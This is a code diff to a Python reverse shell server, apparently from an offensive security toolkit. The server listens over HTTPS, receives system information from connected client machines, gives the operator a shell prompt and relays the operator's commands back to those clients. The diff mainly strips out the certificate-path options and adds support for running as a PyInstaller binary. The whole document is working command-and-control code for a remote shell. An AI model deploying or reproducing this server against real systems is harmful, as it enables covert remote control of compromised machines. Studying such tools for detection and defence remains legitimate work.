@@ -5,6 +5,7 @@ __author__ = "EONRaider @ keybase.io/eonraider"
 
 import json
 import ssl
+import sys
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 from urllib.parse import parse_qs
@@ -22,7 +23,6 @@ class ShellHandler(BaseHTTPRequestHandler):
     def do_GET(self) -> None:
         """Returns a simple JSON status message for the purpose of
         health checking."""
-
         self.send_header("Content-type", "application/json")
         self._set_headers()
         self.wfile.write(json.dumps({"status": "ok"}).encode())
@@ -31,7 +31,6 @@ class ShellHandler(BaseHTTPRequestHandler):
         """Handles POST requests by dispatching the message received
         from each client to their respective methods, depending on the
         contents of the body."""
-
         length = int(self.headers.get("Content-Length"))
         request_body: dict[str, list[str]] = parse_qs(
             self.rfile.read(length).decode())
@@ -43,7 +42,6 @@ class ShellHandler(BaseHTTPRequestHandler):
 
     def _open_session(self, session_info: list[str]) -> None:
         """Displays client system information on connection."""
-
         print("[>] Connection established")
         info = {"Client address": ":".join(str(e) for e in self.client_address)}
         info |= json.loads(session_info[0])
@@ -56,7 +54,6 @@ class ShellHandler(BaseHTTPRequestHandler):
         """Builds the shell prompt with basic information received from
         the client, waits for the user's input and sends it back as a
         response."""
-
         gc, nc = "\x1b[0;32m", "\x1b[0m"  # green color, no color
         shell = ("\t{0}[{1}:{2}]{3} {4}"
                  .format(gc, *self.client_address, nc, *shell_info)
@@ -81,85 +78,50 @@ class ShellHandler(BaseHTTPRequestHandler):
 
 
 class ShellServer:
-    def __init__(self,
-                 host: str,
-                 port: int, *,
-                 server_cert: [str, Path] = None,
-                 ca_cert: [str, Path] = None,
-                 ca_private_key: [str, Path] = None):
+    def __init__(self, host: str, port: int):
         """Create a Reverse Shell Server that communicates with clients
-        through HTTPS.
-
-        :param host: Hostname or address of the server.
-        :param port: Port number to be used by the server.
-        :param server_cert: (Optional) Absolute path to a file
-            containing the server's certificate. A certificate will be
-            created for the server if set to None.
-        :param ca_cert: (Optional) Absolute path to a file containing
-            the certificate for the Certificate Authority (CA). This CA
-            will be trusted by both the server and its clients. A CA
-            will be created if set to None.
-        :param ca_private_key: (Optional) Absolute path to a file
-            containing the private key for the CA. A private key with a
-            default length of 2048 bits will be created for the CA if
-            set to None.
-        """
-
-        self._host = host
-        self._port = port
+        through HTTPS."""
+        self.host = host
+        self.port = port
         self._ca = None
-        self.ca_private_key = ca_private_key
-        self.ca_cert = ca_cert
-        self.server_cert = server_cert
-        self.server_address = self._host, self._port
+
+    @property
+    def server_address(self) -> tuple[str, int]:
+        return self.host, self.port
+
+    @property
+    def base_path(self) -> Path:
+        """
+        Gets the absolute path for the directory of the current file.
+        """
+        try:
+            '''If the file is compiled as a binary by PyInstaller, its 
+            path will be set by sys._MEIPASS'''
+            return Path(sys._MEIPASS)
+        except AttributeError:
+            return Path(__file__).parent.absolute()
 
     @property
     def ca_cert(self) -> Path:
-        """
-        Gets a valid path to a CA certificate file.
-        Sets a path to a CA file if it is valid or creates a new pair of
-        RSA keys that are used to generate a new CA certificate file.
-        """
-        return self._ca_cert
-
-    @ca_cert.setter
-    def ca_cert(self, path: [str, Path, None]):
-        try:
-            self._ca_cert = Path(path)
-            if self.ca_private_key is None:
-                raise SystemExit("The private key for the Certificate "
-                                 "Authority is required for signing new client "
-                                 "certificates.")
-            self._ca = CA.from_pem(
-                cert_bytes=bytes(self._ca_cert),
-                private_key_bytes=bytes(self.ca_private_key))
-        except TypeError:  # path is set to None
-            self._ca_cert = Path(__file__).parent.joinpath("ca.pem")
-            if not self._ca_cert.is_file():
-                # path is valid but the certificate does not exist yet
-                self._ca = CA()
-                self._ca.cert_pem.write_to_path(str(self._ca_cert))
+        """Gets a valid path to a CA certificate file if it exists or
+        creates one for a new CA and then returns it."""
+        ca_cert = self.base_path.joinpath("ca.pem")
+        if not ca_cert.exists():  # Create CA certificate
+            self._ca = CA()
+            self._ca.cert_pem.write_to_path(str(ca_cert))
+        return ca_cert
 
     @property
     def server_cert(self) -> Path:
-        """
-        Gets a valid path to the server's certificate file.
-        Sets a path to the server's certificate file if it is valid or
-        creates a new certificate signed by the established CA.
-        """
-        return self._server_cert
-
-    @server_cert.setter
-    def server_cert(self, path: [str, Path, None]):
-        try:
-            self._server_cert = Path(path)
-        except TypeError:  # path is set to None
-            self._server_cert = Path(__file__).parent.joinpath("server.pem")
-        if not self._server_cert.is_file():
-            # path is valid but the certificate does not exist yet
-            server_cert = self._ca.issue_cert(self._host)
-            server_cert.private_key_and_cert_chain_pem.write_to_path(
-                str(self._server_cert))
+        """Gets a valid path to the server's certificate file if it
+        exists or creates a new certificate signed by the established
+        CA and then returns it."""
+        server_cert = self.base_path.joinpath("server.pem")
+        if not server_cert.exists():  # Create server certificate
+            signed_cert = self._ca.issue_cert(self.host)
+            signed_cert.private_key_and_cert_chain_pem.write_to_path(
+                str(server_cert))
+        return server_cert
 
     def execute(self) -> None:
         with HTTPServer(self.server_address, ShellHandler) as httpd:
@@ -189,28 +151,7 @@ if __name__ == '__main__':
                         required=True,
                         metavar="<port>",
                         help="Port number to bind the server to.")
-    parser.add_argument("--server-cert",
-                        type=str,
-                        metavar="<path>",
-                        help="Absolute path to a file containing the server's "
-                             "certificate.")
-    parser.add_argument("--ca-cert",
-                        type=str,
-                        metavar="<path>",
-                        help="Absolute path to a file containing the "
-                             "certificate for the Certificate Authority (CA).")
-    parser.add_argument("--ca-private-key",
-                        type=str,
-                        metavar="<path>",
-                        help="Absolute path to a file containing the private "
-                             "key of the Certificate Authority (CA).")
 
     _args = parser.parse_args()
 
-    ShellServer(
-        host=_args.host,
-        port=_args.port,
-        server_cert=_args.server_cert,
-        ca_cert=_args.ca_cert,
-        ca_private_key=_args.ca_private_key
-    ).execute()
+    ShellServer(host=_args.host, port=_args.port).execute()
